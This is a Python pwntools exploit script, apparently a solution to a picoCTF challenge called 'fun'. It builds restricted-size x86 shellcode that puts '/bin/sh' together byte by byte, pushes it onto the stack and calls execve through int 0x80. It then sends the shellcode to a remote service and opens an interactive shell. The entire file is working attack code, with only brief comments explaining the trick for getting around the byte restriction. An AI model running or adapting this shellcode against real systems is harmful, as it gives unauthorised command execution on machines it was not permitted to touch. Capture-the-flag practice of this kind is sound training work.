#!/usr/bin/env python3

from pwn import *

exe = ELF("./fun")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mercury.picoctf.net", 26072)

    return r


def main():
    r = conn()

    instructions = []
    reversed_binsh_str = b'/bin/sh\x00'.ljust(8, b'\x00')[::-1]

    # Pushing '/bin/sh' onto the stack
    # Accumulate in eax before pushing because bytewise pushes are not allowed
    for i in range(len(reversed_binsh_str)//4):
        to_push = reversed_binsh_str[i*4:(i+1)*4]
        for j in range(4):
            instr_one_byte = ['mov al, ' + hex(to_push[j])]
            if j != 3: instr_one_byte.extend(['shl eax, 0x1'] * 8)
            instructions.extend(instr_one_byte)
        instructions.extend(['push eax', 'nop']) # Need to add nop to extend instr to 2 bytes

    instructions.extend([
        'push esp',      # ebx -> /bin/sh\x00
        'pop ebx',
        'xor eax, eax',  # eax = 11
        'mov al, 0xb',
        'xor ecx, ecx',  # ecx = 0
        'xor edx, edx',  # edx = 0
        'int 0x80'       # syscall
    ])

    r.sendlineafter(b'run:\n', asm('\n'.join(instructions)))

    r.interactive()


if __name__ == "__main__":
    main()
